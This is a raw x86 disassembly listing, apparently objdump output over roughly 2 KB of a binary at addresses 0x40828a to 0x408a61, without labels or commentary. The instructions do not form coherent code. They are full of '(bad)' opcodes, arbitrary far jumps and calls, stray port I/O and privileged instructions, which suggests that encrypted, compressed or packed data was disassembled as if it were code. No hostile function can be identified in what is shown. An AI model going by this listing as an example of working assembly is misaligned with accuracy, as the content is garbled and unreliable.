  40828a:	js     0x408271
  40828c:	ret    
  40828d:	shl    DWORD PTR [ecx-0x80],0xe0
  408291:	pusha  
  408292:	dec    ebx
  408293:	shr    esp,0xb7
  408296:	call   0x7c64b3a5
  40829b:	pop    ebp
  40829c:	add    DWORD PTR [edx+0x19d9023d],ebp
  4082a2:	xchg   edi,eax
  4082a3:	js     0x408257
  4082a5:	retf   0xde5c
  4082a8:	out    dx,eax
  4082a9:	cmc    
  4082aa:	and    al,0x72
  4082ac:	test   BYTE PTR [ecx+0x3a],ch
  4082af:	(bad)
  4082b2:	mov    al,ds:0xae54eea8
  4082b7:	or     esp,ebp
  4082b9:	jns    0x4082a4
  4082bb:	xlat   BYTE PTR ds:[ebx]
  4082bc:	xor    dh,BYTE PTR [ecx-0xe]
  4082bf:	lods   eax,DWORD PTR ds:[esi]
  4082c0:	xchg   ecx,eax
  4082c1:	xchg   BYTE PTR [ecx+0x62],ah
  4082c4:	lods   al,BYTE PTR ds:[esi]
  4082c5:	pop    es
  4082c6:	mov    eax,ds:0xbbd7fd09
  4082cb:	mov    gs,eax
  4082cd:	jecxz  0x408310
  4082cf:	mov    ebp,0x454760b7
  4082d4:	add    bl,BYTE PTR [esi+0x13]
  4082d7:	pop    es
  4082d8:	nop
  4082d9:	cld    
  4082da:	out    dx,eax
  4082db:	std    
  4082dc:	add    eax,0x2baff0bd
  4082e1:	jnp    0x4082e2
  4082e3:	cli    
  4082e4:	daa    
  4082e5:	ret    0x9895
  4082e8:	lds    eax,FWORD PTR ds:0x935ac83c
  4082ee:	mov    esi,0xd2b02096
  4082f3:	cs cmp ah,cl
  4082f6:	jg     0x40830b
  4082f8:	ins    BYTE PTR es:[edi],dx
  4082f9:	sahf   
  4082fa:	leave  
  4082fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082fc:	push   ebp
  4082fd:	cmp    BYTE PTR [esp+eax*8+0x4508c5d2],ch
  408304:	imul   edi,DWORD PTR [edx-0x68ee6ea2],0xffffffec
  40830b:	lods   eax,DWORD PTR ds:[esi]
  40830c:	arpl   WORD PTR [esi+edx*4],sp
  40830f:	jmp    0x92b7c407
  408314:	pop    ebx
  408315:	xchg   edx,eax
  408316:	nop
  408317:	sbb    BYTE PTR [ecx+0x5a72e6fd],ch
  40831d:	xlat   BYTE PTR ds:[ebx]
  40831e:	jbe    0x408394
  408320:	or     DWORD PTR [edi],eax
  408322:	fcomip st,st(7)
  408324:	xor    ch,BYTE PTR [ebx+0x7b]
  408327:	add    ebx,DWORD PTR [bp+di-0xdae]
  40832c:	pop    edx
  40832d:	(bad)  [eax-0x202d6de5]
  408333:	adc    DWORD PTR [eax+0x29],0xbe5afa9d
  40833a:	mov    ebp,0xb1ea9657
  40833f:	sbb    DWORD PTR [ebx+0x5a],ebp
  408342:	adc    cl,BYTE PTR [ebp-0x17]
  408345:	cs jmp 0x40833b
  408348:	cs jae 0x40839b
  40834b:	dec    edx
  40834c:	or     DWORD PTR [ecx+ecx*4-0x75],ebx
  408350:	inc    esp
  408351:	jle    0x408357
  408353:	lods   eax,DWORD PTR ds:[esi]
  408354:	daa    
  408355:	ret    
  408356:	mov    ebx,0xa706a938
  40835b:	neg    DWORD PTR [edx+0x7bc733a4]
  408361:	jg     0x408366
  408363:	sbb    ebp,0xffffffe9
  408366:	inc    ebp
  408367:	cmc    
  408368:	xlat   BYTE PTR ds:[ebx]
  408369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40836a:	mov    bl,0x9
  40836c:	dec    eax
  40836d:	inc    esi
  40836e:	shl    al,0x7f
  408371:	pop    esi
  408372:	lock dec ebx
  408374:	dec    ebx
  408375:	mov    eax,ds:0xd1d78e8
  40837a:	call   0x7cf2cfe7
  40837f:	add    BYTE PTR [edx],dl
  408381:	mov    DWORD PTR [eax],ebx
  408383:	mov    ch,BYTE PTR [edx]
  408385:	pop    ebx
  408386:	push   edx
  408387:	mov    ds,esi
  408389:	dec    esp
  40838a:	xchg   DWORD PTR [esi+0x40],edx
  40838d:	cmp    eax,0x6f0f784
  408392:	call   0x7a3f2950
  408397:	pop    esp
  408398:	inc    eax
  408399:	mov    edi,0xc288c8af
  40839e:	mov    ds:0xc23df54b,al
  4083a3:	jle    0x4083e5
  4083a5:	in     al,0xff
  4083a7:	xor    esi,0xffffffcc
  4083aa:	into   
  4083ab:	dec    eax
  4083ad:	mov    cl,0x41
  4083af:	(bad)  
  4083b0:	push   0xaad83559
  4083b5:	ins    DWORD PTR es:[edi],dx
  4083b6:	pop    esi
  4083b7:	les    esp,FWORD PTR [edx+eiz*2]
  4083ba:	fild   DWORD PTR [ebx+edi*2-0x3db2a46]
  4083c1:	cmc    
  4083c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083c3:	leave  
  4083c4:	cmp    dh,dl
  4083c6:	clc    
  4083c7:	or     al,0xa7
  4083c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083ca:	int    0x79
  4083cc:	xlat   BYTE PTR ds:[ebx]
  4083cd:	cdq    
  4083ce:	mov    DWORD PTR [edi+0x5],ebp
  4083d1:	or     al,0x90
  4083d3:	mov    ebx,0xa33b44f
  4083d8:	mov    WORD PTR [esi+0x4d5022ab],?
  4083de:	or     al,0xe6
  4083e0:	lea    esi,[esi+0x632b52b2]
  4083e6:	(bad)  
  4083e7:	das    
  4083e8:	push   eax
  4083e9:	je     0x40837b
  4083eb:	pop    esi
  4083ec:	sar    DWORD PTR [esi-0x43],1
  4083ef:	sub    BYTE PTR [edi+0x11c19d4f],bh
  4083f5:	pushf  
  4083f6:	into   
  4083f7:	push   ds
  4083f8:	jo     0x408441
  4083fa:	sbb    edi,DWORD PTR [edi+0x6d]
  4083fd:	jg     0x408442
  4083ff:	push   0xffffffc2
  408401:	int3   
  408402:	data16 sti 
  408404:	into   
  408405:	(bad)  
  408406:	(bad)  
  408407:	jmp    0x465687e8
  40840c:	(bad)  
  40840d:	dec    esi
  40840e:	fs dec ecx
  408410:	out    dx,eax
  408411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408412:	add    bh,cl
  408414:	mov    esp,0x4ff70c30
  408419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40841a:	or     edi,DWORD PTR ds:0x711864b8
  408420:	mov    al,0xa0
  408422:	call   FWORD PTR [edx-0x3e44e284]
  408428:	loope  0x408475
  40842a:	jle    0x4083ac
  40842c:	sub    BYTE PTR [edx+0x34],bl
  40842f:	(bad)  
  408430:	das    
  408431:	es cmp eax,0x36236e36
  408437:	mov    bl,0x8c
  408439:	xchg   esi,eax
  40843a:	xor    al,0xda
  40843c:	cli    
  40843d:	jnp    0x408481
  40843f:	fdivr  st,st(7)
  408441:	imul   esp,DWORD PTR [ecx+edx*4+0x1d],0x386a18f5
  408449:	mov    ebp,DWORD PTR [ebx+eax*1]
  40844c:	mov    ebx,ebp
  40844e:	jno    0x408438
  408450:	xchg   esi,eax
  408451:	or     edx,DWORD PTR [ebx]
  408453:	in     al,dx
  408454:	fstp   QWORD PTR [ebx-0x3df7bcdb]
  40845a:	sbb    bh,dh
  40845c:	pop    ds
  40845d:	not    DWORD PTR [edi+0x4118741d]
  408463:	hlt    
  408464:	xchg   esp,eax
  408465:	(bad)  
  408467:	mov    cl,0x21
  408469:	data16 fisub DWORD PTR [ebp-0x216be23e]
  408470:	add    ebp,edx
  408472:	xchg   BYTE PTR [ebp+0x47],ch
  408475:	cmc    
  408476:	imul   edx
  408478:	in     eax,dx
  408479:	jmp    0x4084ea
  40847b:	mov    ebx,0xeafc328f
  408480:	jg     0x4084ec
  408482:	mov    ecx,edx
  408484:	jp     0x408431
  408486:	mov    eax,0x6a4dd69d
  40848b:	(bad)  
  40848c:	adc    eax,0xc11ea3c2
  408491:	mov    BYTE PTR [edi+0x2b],bh
  408494:	add    ah,BYTE PTR [edx-0x2a583ea3]
  40849a:	sub    eax,0xc9ec4525
  40849f:	repz dec esp
  4084a1:	pop    esi
  4084a2:	aaa    
  4084a3:	leave  
  4084a4:	adc    ecx,DWORD PTR [edi-0x13]
  4084a7:	push   ebx
  4084a8:	sbb    dh,ah
  4084aa:	adc    al,0xf7
  4084ac:	les    ebp,FWORD PTR [ecx+0x38]
  4084af:	mov    bh,0x60
  4084b1:	cdq    
  4084b2:	fs test al,0xa4
  4084b5:	cmp    DWORD PTR [edx+0x6c489535],edx
  4084bb:	sti    
  4084bc:	or     ecx,edx
  4084be:	sahf   
  4084bf:	inc    esi
  4084c0:	push   es
  4084c1:	jle    0x408538
  4084c3:	repnz iret 
  4084c5:	rol    edi,1
  4084c7:	loope  0x408503
  4084c9:	cs dec ebp
  4084cb:	daa    
  4084cc:	daa    
  4084cd:	rcr    eax,0x81
  4084d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084d1:	add    eax,0x97aa2420
  4084d6:	(bad)  
  4084d7:	sbb    ecx,DWORD PTR [ecx+ebp*2]
  4084da:	cmp    edx,DWORD PTR [eax-0x4c]
  4084dd:	imul   eax,DWORD PTR [esi],0xe95de626
  4084e3:	fst    st(6)
  4084e5:	add    al,0x41
  4084e7:	add    ebp,DWORD PTR [esi]
  4084e9:	mov    cl,0x8b
  4084eb:	fbstp  TBYTE PTR [eax+0x12]
  4084ee:	pop    esi
  4084ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f0:	stos   DWORD PTR es:[edi],eax
  4084f1:	add    BYTE PTR [esp+edi*1-0x74],dh
  4084f5:	sbb    al,0x13
  4084f7:	fs dec edx
  4084f9:	mov    edx,0x6ffd2e3a
  4084fe:	or     al,0x91
  408500:	(bad)  
  408501:	hlt    
  408502:	jmp    0x3180:0xf9f91ddd
  408509:	mov    bh,0xc0
  40850b:	mov    dh,0x95
  40850d:	sti    
  40850e:	(bad)  
  408510:	aam    0x93
  408512:	ins    BYTE PTR es:[edi],dx
  408513:	add    DWORD PTR [edx-0x7513f42f],0xffffffe9
  40851a:	or     esp,DWORD PTR [edi]
  40851c:	fld    DWORD PTR [ecx+0x52c4d9ac]
  408522:	jge    0x40850b
  408524:	cmp    eax,0xd1110648
  408529:	pop    esp
  40852a:	add    bl,BYTE PTR [ebx+esi*2-0x52df34bf]
  408531:	outs   dx,DWORD PTR ds:[esi]
  408532:	rcr    BYTE PTR [eax],0xce
  408535:	cmp    al,0x14
  408537:	adc    dh,BYTE PTR [edi]
  408539:	test   eax,0x3ba3ab2c
  40853e:	outs   dx,DWORD PTR ds:[esi]
  40853f:	fisubr WORD PTR [ebx+edi*8]
  408542:	sub    ch,bl
  408544:	retf   
  408545:	sbb    esp,eax
  408547:	sub    al,0x97
  408549:	inc    esp
  40854a:	sbb    dh,ah
  40854c:	sub    DWORD PTR [ebp-0x18],ebp
  40854f:	shl    BYTE PTR [eax+ebp*8+0x51a030da],0xee
  408557:	loope  0x4085bb
  408559:	mov    ecx,0x4b305e31
  40855e:	ror    BYTE PTR [eax-0x40aa91d8],cl
  408564:	mov    edi,0x91d89aa5
  408569:	push   ebx
  40856a:	aam    0x32
  40856c:	xchg   ebx,eax
  40856d:	cmp    eax,0x672f46bb
  408572:	xchg   ebx,eax
  408573:	test   al,0x9a
  408575:	push   ecx
  408576:	retf   0xda1c
  408579:	xchg   edi,eax
  40857a:	sbb    al,0xb9
  40857c:	iret   
  40857d:	test   DWORD PTR [ebx+0x46],0x22724b89
  408584:	and    bh,dh
  408586:	sbb    eax,0xd0abfefb
  40858b:	sub    DWORD PTR [ebx],ecx
  40858d:	lods   al,BYTE PTR ds:[esi]
  40858e:	jno    0x4085f0
  408590:	into   
  408591:	imul   ebx,DWORD PTR [esi+edi*2+0x3a33b7d1],0x5
  408599:	aas    
  40859a:	cmc    
  40859b:	dec    eax
  40859c:	adc    BYTE PTR [ebp+0x2efe8d75],cl
  4085a2:	ja     0x408554
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xde73132b
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085d2
  4085c4:	xchg   edx,eax
  4085c5:	gs sub ah,cl
  4085c8:	and    al,0xef
  4085ca:	mov    esp,0x786fd9c0
  4085cf:	int    0x8c
  4085d1:	cmp    al,0xc3
  4085d3:	sbb    ch,BYTE PTR [ebp+0x23d59369]
  4085d9:	(bad)  
  4085da:	imul   ebx,esi,0xffffffd7
  4085dd:	dec    ebx
  4085de:	mov    al,0xf4
  4085e0:	repz push 0xffffff9a
  4085e3:	mov    bh,0xcb
  4085e5:	je     0x408653
  4085e7:	mov    bl,0x6
  4085e9:	daa    
  4085ea:	sbb    BYTE PTR ds:0xe4526c2f,0xd4
  4085f1:	das    
  4085f2:	fcom   DWORD PTR [esi+0x39]
  4085f5:	cs icebp 
  4085f7:	jl     0x4085ce
  4085f9:	mov    al,ds:0xf4eeb32b
  4085fe:	mov    edi,0x4679f185
  408603:	xor    al,0xc2
  408605:	lds    esi,FWORD PTR [ebx+0x2e7e5037]
  40860b:	mov    al,0xd9
  40860d:	mov    bh,BYTE PTR [ecx-0x5]
  408610:	fild   WORD PTR [ebp+0x61]
  408613:	stos   DWORD PTR es:[edi],eax
  408614:	sbb    BYTE PTR [eax-0x24818399],al
  40861a:	sbb    dh,dl
  40861c:	xchg   ebp,eax
  40861d:	and    edx,ebp
  40861f:	jmp    0x4085d0
  408621:	sub    ah,BYTE PTR [edx+0x1ec4a0b4]
  408627:	cli    
  408628:	fsub   QWORD PTR [eax-0x13be483]
  40862e:	ins    DWORD PTR es:[edi],dx
  40862f:	pop    edi
  408630:	nop
  408631:	jmp    0xccf0:0xb9ab2d0d
  408638:	xor    bh,dh
  40863a:	mov    eax,0xb9b7d86d
  40863f:	pop    es
  408640:	inc    ecx
  408641:	push   eax
  408642:	sub    eax,0x874c3e44
  408647:	mov    ds:0xcf269f54,eax
  40864c:	inc    edi
  40864d:	push   cs
  40864e:	jp     0x4086b4
  408650:	aaa    
  408651:	loop   0x408673
  408653:	cmp    al,0x4e
  408655:	inc    ecx
  408656:	jg     0x4085f7
  408658:	cmp    bl,ch
  40865a:	jg     0x40863b
  40865c:	sar    BYTE PTR [ebx],0xf7
  40865f:	jmp    0x40868c
  408661:	jle    0x408622
  408663:	pusha  
  408664:	dec    ecx
  408665:	neg    DWORD PTR [esi]
  408667:	shl    DWORD PTR [ebx],cl
  408669:	int3   
  40866a:	fdiv   QWORD PTR [eax-0x194f2152]
  408670:	or     esi,DWORD PTR [edi+0xa]
  408673:	fisub  DWORD PTR [ecx-0x7da229ed]
  408679:	mov    BYTE PTR [ebp+ebp*1+0x247f39b3],dh
  408680:	in     al,dx
  408681:	into   
  408682:	sbb    al,0xe1
  408684:	and    al,0xe9
  408686:	jg     0x408631
  408688:	aad    0xac
  40868a:	es sub eax,0x53d07ffb
  408690:	cwde   
  408691:	jnp    0x40868a
  408693:	jae    0x408707
  408695:	lods   al,BYTE PTR ds:[esi]
  408696:	enter  0x92f1,0xb1
  40869a:	imul   edx,DWORD PTR [edx],0xe7f39577
  4086a0:	cmp    BYTE PTR [eax-0x72],dh
  4086a3:	push   0x6c
  4086a5:	adc    esp,edi
  4086a7:	repnz shr BYTE PTR [esi+eiz*4-0x74af3576],1
  4086af:	enter  0x685f,0xd5
  4086b3:	outs   dx,BYTE PTR ds:[esi]
  4086b4:	adc    al,0x6e
  4086b6:	mov    esp,0xa5a1513f
  4086bc:	xor    al,0x1a
  4086be:	jo     0x4086b6
  4086c0:	fs pop ds
  4086c2:	and    BYTE PTR [ebx+0x7fa6332f],ch
  4086c8:	jle    0x4086a7
  4086ca:	leave  
  4086cb:	shr    DWORD PTR [ebp+0x55],cl
  4086ce:	and    esi,DWORD PTR [edx+ebx*4]
  4086d1:	aad    0xeb
  4086d3:	push   edi
  4086d4:	mov    fs,WORD PTR [ecx-0x223be6c3]
  4086da:	xor    ebp,edx
  4086dc:	xor    eax,0xb1f22203
  4086e1:	pusha  
  4086e2:	xchg   esi,eax
  4086e3:	ins    BYTE PTR es:[edi],dx
  4086e4:	jae    0x40867f
  4086e6:	cmp    DWORD PTR [edi+0x7e],ebp
  4086e9:	jp     0x408707
  4086eb:	sbb    BYTE PTR [ebx-0x3],dl
  4086ee:	add    dh,bh
  4086f0:	fadd   DWORD PTR [edi]
  4086f2:	xchg   ecx,eax
  4086f3:	xchg   DWORD PTR [edx+eax*2-0x7b],edi
  4086f7:	mov    ds:0x23ae1969,eax
  4086fc:	cmp    BYTE PTR [edx],0x33
  4086ff:	adc    DWORD PTR ds:0xdcd5e4cc,esp
  408705:	loope  0x4086ce
  408707:	ror    DWORD PTR [edi-0x5681b9c3],cl
  40870d:	xchg   esi,eax
  40870e:	sub    eax,0x8ba54759
  408713:	lods   al,BYTE PTR ds:[esi]
  408714:	dec    ecx
  408715:	(bad)  
  408716:	call   0xafef:0xb0849ab2
  40871d:	imul   ebp,DWORD PTR [edi+0x59],0x9234d6ce
  408724:	mov    edx,0x6ae873a5
  408729:	pop    DWORD PTR [edi+0x25313729]
  40872f:	xchg   edi,eax
  408730:	ja     0x408749
  408732:	(bad)  
  408733:	mov    ebp,0x7e145ed6
  408738:	or     BYTE PTR [eax+ebx*4],ch
  40873b:	ficom  DWORD PTR [ebp-0x6b]
  40873e:	mov    ds:0x6c8ea252,al
  408743:	repnz add al,BYTE PTR [eax-0x3ca821bb]
  40874a:	cmp    al,0xc0
  40874c:	stos   BYTE PTR es:[edi],al
  40874d:	das    
  40874e:	add    eax,0x6e228438
  408753:	and    eax,0xd1151a09
  408758:	jle    0x408791
  40875a:	mov    edi,0xe45221f3
  40875f:	out    0xbb,eax
  408761:	or     eax,0x71cace35
  408766:	in     eax,dx
  408767:	dec    edi
  408768:	mov    dl,0xbf
  40876a:	(bad)  [ebp-0x3]
  40876d:	ins    BYTE PTR es:[edi],dx
  40876e:	inc    eax
  40876f:	inc    eax
  408770:	(bad)  
  408771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408772:	leave  
  408773:	cwde   
  408774:	test   BYTE PTR [edi],bl
  408776:	xor    al,0x22
  408778:	xor    eax,0x6c5f353b
  40877d:	push   cs
  40877e:	jle    0x4087da
  408780:	pop    ebx
  408781:	ror    BYTE PTR [esi],cl
  408783:	dec    esp
  408784:	cmc    
  408785:	xchg   esi,eax
  408786:	pushw  cs
  408788:	adc    eax,0x6a66fb27
  40878d:	pop    ds
  40878e:	mov    edi,0x8c88832b
  408793:	xchg   edx,eax
  408794:	int3   
  408795:	sti    
  408796:	inc    ecx
  408797:	mov    edi,0xf02b2dad
  40879c:	cmp    DWORD PTR [ebp+0x2e389e55],ebp
  4087a2:	inc    ax
  4087a4:	pop    ebp
  4087a5:	loop   0x408793
  4087a7:	xor    bl,BYTE PTR [edi+eax*8+0x3e]
  4087ab:	rcl    edx,cl
  4087ad:	popf   
  4087ae:	les    esi,FWORD PTR [edi-0x76634321]
  4087b4:	xor    edx,edx
  4087b6:	frstor [esi-0x36]
  4087b9:	sub    dh,BYTE PTR [eax]
  4087bb:	(bad)  
  4087bc:	jae    0x4087d3
  4087be:	mov    DWORD PTR ds:0x2f29d61b,ebp
  4087c4:	jb     0x4087fd
  4087c6:	push   0x30
  4087c8:	shl    DWORD PTR [eax],cl
  4087ca:	loope  0x4087a5
  4087cc:	pop    eax
  4087cd:	add    eax,0xc972d1b3
  4087d2:	mov    ebp,0x821d3a20
  4087d7:	cmp    BYTE PTR [edi+0x5b],ah
  4087da:	cmp    DWORD PTR ds:[edx-0x7ed84229],edi
  4087e1:	lea    edi,[edx-0x5dca0fc9]
  4087e7:	and    al,0xdb
  4087e9:	cs pop ebx
  4087eb:	gs sti 
  4087ed:	pop    ebx
  4087ee:	pop    esi
  4087ef:	mov    edi,0x343c5331
  4087f4:	xchg   BYTE PTR [edx],dh
  4087f6:	retf   0x743
  4087f9:	fadd   QWORD PTR [edi+0x1e]
  4087fc:	stc    
  4087fd:	lods   al,BYTE PTR ds:[esi]
  4087fe:	pop    ss
  4087ff:	test   eax,0xcb458e39
  408804:	stos   DWORD PTR es:[edi],eax
  408805:	adc    eax,0x638af2a8
  40880a:	daa    
  40880b:	dec    edi
  40880c:	mov    ebx,0x44e5048c
  408811:	pop    ds
  408812:	int3   
  408813:	sbb    al,0x40
  408815:	or     eax,0xbc5e435
  40881a:	and    eax,0x5bfbca89
  40881f:	shl    ah,0x4c
  408822:	add    bh,BYTE PTR [eax+ebp*4+0xc880fb8]
  408829:	stos   BYTE PTR es:[edi],al
  40882a:	mov    BYTE PTR [edi],al
  40882c:	cwde   
  40882d:	mov    cl,0x26
  40882f:	xchg   edi,eax
  408830:	pop    edi
  408831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408832:	push   esp
  408833:	inc    ebx
  408834:	ret    
  408835:	cdq    
  408836:	mov    eax,0x937036bd
  40883b:	inc    ebx
  40883c:	retf   
  40883d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40883e:	jecxz  0x40888f
  408840:	jo     0x408853
  408842:	rcr    BYTE PTR [ecx-0x2a],1
  408845:	out    dx,eax
  408846:	loope  0x4088ae
  408848:	div    BYTE PTR [esi]
  40884a:	scas   al,BYTE PTR es:[edi]
  40884b:	pop    eax
  40884c:	dec    esp
  40884d:	push   cs
  40884e:	das    
  40884f:	cwde   
  408850:	cmp    ecx,DWORD PTR [esi+0x58faf4f1]
  408856:	fimul  DWORD PTR [eax+edi*4+0x15cf94da]
  40885d:	cmp    al,0x67
  40885f:	outs   dx,BYTE PTR ds:[esi]
  408860:	dec    ecx
  408861:	jne    0x4088cd
  408863:	lods   al,BYTE PTR ds:[esi]
  408864:	sbb    bh,cl
  408866:	aaa    
  408867:	fsub   QWORD PTR [ebx+0x18446dde]
  40886d:	test   DWORD PTR [ecx],ebp
  40886f:	push   ebp
  408870:	mov    ebp,0x9d87e3e7
  408875:	xchg   esi,eax
  408876:	mov    dl,0x7a
  408878:	xchg   esp,eax
  408879:	outs   dx,BYTE PTR ds:[esi]
  40887a:	shl    DWORD PTR [edi-0x2d],cl
  40887d:	push   ebx
  40887e:	push   ebp
  40887f:	inc    ebp
  408880:	lock in al,dx
  408882:	jnp    0x408869
  408884:	add    al,0xcd
  408886:	add    BYTE PTR [edx-0x4f],dh
  408889:	pop    edx
  40888a:	or     edx,DWORD PTR [edx-0x38705165]
  408890:	loopne 0x408832
  408892:	fwait
  408893:	stos   DWORD PTR es:[edi],eax
  408894:	push   es
  408895:	inc    ecx
  408896:	xchg   ebp,eax
  408897:	pop    edx
  408898:	rcr    cl,1
  40889a:	jno    0x408879
  40889c:	test   eax,0xdc2e87ed
  4088a1:	repz out dx,eax
  4088a3:	mov    eax,0xeb3d5156
  4088a8:	lods   eax,DWORD PTR ds:[esi]
  4088a9:	inc    edi
  4088aa:	mov    dl,0x1c
  4088ac:	jno    0x408895
  4088ae:	loopne 0x40890a
  4088b0:	jecxz  0x408872
  4088b2:	leave  
  4088b3:	sahf   
  4088b4:	or     BYTE PTR [eax-0x1],dl
  4088b7:	jmp    0x4088cf
  4088b9:	loope  0x408934
  4088bb:	sub    cl,BYTE PTR [edx-0x4e8b00aa]
  4088c1:	xchg   esi,eax
  4088c2:	jo     0x4088cd
  4088c4:	inc    ebx
  4088c5:	push   ecx
  4088c6:	fiadd  DWORD PTR [ebp-0x15]
  4088c9:	test   BYTE PTR [ebp-0x78],dh
  4088cc:	sbb    eax,0x72afaec1
  4088d1:	(bad)  
  4088d2:	call   0x78c7d709
  4088d7:	rcr    BYTE PTR [eax-0x78],0xb7
  4088db:	adc    DWORD PTR [edx-0x2caf0b3f],0x6
  4088e2:	pop    esp
  4088e3:	(bad)  
  4088e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e5:	xor    DWORD PTR [edi-0x27fd5081],edx
  4088eb:	call   0x821c:0x60784990
  4088f2:	aas    
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x60bca301],cl
  40890c:	dec    eax
  40890d:	shl    BYTE PTR [eax-0x69],cl
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408967
  408918:	dec    edi
  408919:	retf   0xcf42
  40891c:	pop    ecx
  40891d:	mov    bl,0x64
  40891f:	fwait
  408920:	inc    ebx
  408921:	shr    DWORD PTR [esi+0x1f],cl
  408924:	es and eax,0x9606e2a8
  40892a:	xchg   edx,eax
  40892b:	(bad)  
  40892c:	(bad)  [ecx+0x72]
  40892f:	or     bh,BYTE PTR [edx+0x5f]
  408932:	ins    BYTE PTR es:[edi],dx
  408933:	pushf  
  408934:	stos   DWORD PTR es:[edi],eax
  408935:	mov    esp,0x765d2126
  40893a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40893b:	mov    edx,0xf65c83f3
  408940:	dec    ecx
  408941:	jae    0x40898e
  408943:	dec    edx
  408944:	xor    al,BYTE PTR [edi+0x5e]
  408947:	lea    edx,[eax+0x7b7e1f8e]
  40894d:	push   es
  40894e:	dec    edi
  40894f:	fadd   QWORD PTR [edx]
  408951:	push   esi
  408952:	ficom  DWORD PTR [ecx]
  408954:	or     DWORD PTR [ecx],0x23eb5b32
  40895a:	(bad)  [ecx+0xdc92c65]
  408960:	(bad)  
  408961:	(bad)  
  408962:	mov    esi,0xe4350f63
  408967:	icebp  
  408968:	ja     0x4089d0
  40896a:	out    0xf,al
  40896c:	adc    al,0xe2
  40896e:	ficomp WORD PTR [esi-0x50225449]
  408974:	or     BYTE PTR [ebx],al
  408976:	mov    dh,0x62
  408978:	rol    BYTE PTR [ebx-0x62],1
  40897b:	add    al,0xc5
  40897d:	cmp    DWORD PTR cs:[esi-0x52],esi
  408981:	nop
  408982:	pop    ebp
  408983:	xor    BYTE PTR [eax],dl
  408985:	adc    al,0xfa
  408987:	jbe    0x4089be
  408989:	in     eax,0xe3
  40898b:	mov    dl,0xe0
  40898d:	das    
  40898e:	xor    BYTE PTR [ecx],ch
  408990:	call   0x589b:0x62391956
  408997:	call   0x93d6:0xe31efceb
  40899e:	adc    DWORD PTR [edx+0x30],edi
  4089a1:	sti    
  4089a2:	or     edx,DWORD PTR [ecx]
  4089a4:	xor    ah,0xee
  4089a7:	shl    dh,0x3b
  4089aa:	cmp    eax,0x66fbecdc
  4089af:	inc    esp
  4089b0:	push   ebp
  4089b1:	jmp    ebx
  4089b3:	mov    bh,0xf0
  4089b5:	clc    
  4089b6:	mov    dl,0xf1
  4089b8:	pop    edi
  4089b9:	ret    
  4089ba:	stos   DWORD PTR es:[edi],eax
  4089bb:	ret    
  4089bc:	fcomp  DWORD PTR [esi+0x49]
  4089bf:	jne    0x40895e
  4089c1:	sbb    eax,0xc82805cd
  4089c6:	xchg   ah,cl
  4089c8:	mov    esp,0xbc2cfd85
  4089cd:	rol    DWORD PTR [eax+0x43],0x46
  4089d1:	ss fxch st(2)
  4089d4:	stc    
  4089d5:	mov    eax,ds:0xc8220dc
  4089da:	ror    bh,cl
  4089dc:	int    0x86
  4089de:	xor    DWORD PTR [edi-0x30f4f501],ecx
  4089e4:	inc    esi
  4089e5:	js     0x4089e8
  4089e7:	adc    ecx,DWORD PTR [ecx+0xa]
  4089ea:	jnp    0x40896f
  4089ec:	push   edx
  4089ed:	test   eax,0x431a48e3
  4089f2:	mov    dh,0x70
  4089f4:	dec    esp
  4089f5:	sbb    al,0xaa
  4089f7:	icebp  
  4089f8:	cmp    DWORD PTR [esi],0x69072d45
  4089fe:	dec    ecx
  4089ff:	dec    ebx
  408a00:	dec    ecx
  408a01:	xor    edi,ecx
  408a03:	and    edi,DWORD PTR [edi-0x1f]
  408a06:	lock sub bl,bl
  408a09:	mov    bl,ah
  408a0b:	outs   dx,BYTE PTR ds:[esi]
  408a0c:	outs   dx,BYTE PTR ds:[esi]
  408a0d:	adc    al,0x0
  408a0f:	fisttp WORD PTR [ecx]
  408a11:	add    cl,ah
  408a13:	xchg   ecx,eax
  408a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a15:	cmp    eax,0x60ff796f
  408a1a:	sub    DWORD PTR [eax-0x3f],esi
  408a1d:	dec    al
  408a1f:	ficomp DWORD PTR [ebp+0x4e]
  408a22:	sbb    bl,BYTE PTR [esi+edx*2-0x72089d74]
  408a29:	and    ebp,esi
  408a2b:	jns    0x4089b5
  408a2d:	pop    ebx
  408a2e:	xchg   edx,eax
  408a2f:	mov    edi,0x69dcf94
  408a34:	jmp    0x72ba38fb
  408a39:	(bad)  
  408a3a:	mov    ebx,esp
  408a3c:	push   es
  408a3d:	fmul   DWORD PTR [eax-0x2f]
  408a40:	out    dx,eax
  408a41:	or     ah,BYTE PTR [bp+di]
  408a44:	adc    bl,BYTE PTR [edx]
  408a46:	mov    ds:0x947cc2ef,al
  408a4b:	or     BYTE PTR [esi+edx*1-0x4afa5495],al
  408a52:	xlat   BYTE PTR ds:[ebx]
  408a53:	and    dl,BYTE PTR [ebx]
  408a55:	retf   0x7c68
  408a58:	inc    edi
  408a59:	push   esp
  408a5a:	mov    edx,0x97d363db
  408a5f:	shl    ebp,cl
  408a61:	push   ds
